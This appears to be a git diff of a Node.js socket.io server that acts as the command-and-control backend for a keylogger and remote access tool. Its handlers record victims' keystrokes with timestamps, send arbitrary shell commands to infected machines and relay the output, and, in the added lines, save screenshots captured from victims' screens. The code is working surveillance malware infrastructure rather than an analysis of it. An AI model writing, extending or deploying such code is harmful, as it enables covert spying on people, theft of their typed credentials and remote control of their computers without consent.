@@ -88,34 +88,50 @@ io.on("connection", (socket) => {
     checkDirectoryExists(socket.name);
     offlineclients.splice(offlineclients.indexOf(socket.name), 1);
     //console.log("Clients: " + clients);
+    //socket.emit("command", "screenshot");
+
   });
+
   socket.on("logs", async (msg) => {
     await io.fetchSockets(); //fix error c++ first send keystrokes
     //console.log(socket.name + ":" + msg);
-    writeToFile(socket.name, msg);
+    const now = new Date();
+    const current = `[${now.getHours()}:${now.getMinutes()}] `;
+    writeToFile(socket.name, current+msg);
   });
+
   socket.on("command", (msg) => {
     console.log(msg);
-    let powershell = `powershell -command \"${msg.cmd}"`;
-    io.sockets.sockets.get(msg.id).emit("command", powershell);
+    io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
   });
 
   socket.on("commandResult", async (msg) => {
     let bufferObj = Buffer.from(msg, "base64");
     let decodedString = bufferObj.toString("utf-8");
-    //var someEncodedString = Buffer.from('someString', 'utf-8').toString();
-
-    console.log(decodedString);
+    //console.log(decodedString);
     io.emit("commandResult", { id: socket.id, response: decodedString });
-    //fs.writeFileSync("test.txt", decodedString);
+  });
+
+  socket.on("screenshotResult", async (msg) => {
+    console.log(msg);
+    var d = new Date,
+    dformat = [d.getMonth()+1,
+               d.getDate(),
+               d.getFullYear()].join('_')+'-'+
+              [d.getHours(),d.getMinutes(),d.getSeconds()].join('_');
+    const buffer = Buffer.from(msg, "base64");
+    fs.writeFileSync(`./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`, buffer);
+
   });
   socket.on("delete", async (msg) => {
     fs.rmSync(`./clients/${msg.clientname}`, { recursive: true, force: true });
     offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
   });
+
   socket.on("disconnect", () => {
-    console.log("Wyszedl: " + socket.name + " " + socket.ip);
     if (socket.name != null) {
+      console.log("Wyszedl: " + socket.name + " " + socket.ip);
+
       //if socket is a keylogger instance
       removeById(clients, socket.id);
       offlineclients.push(socket.name);
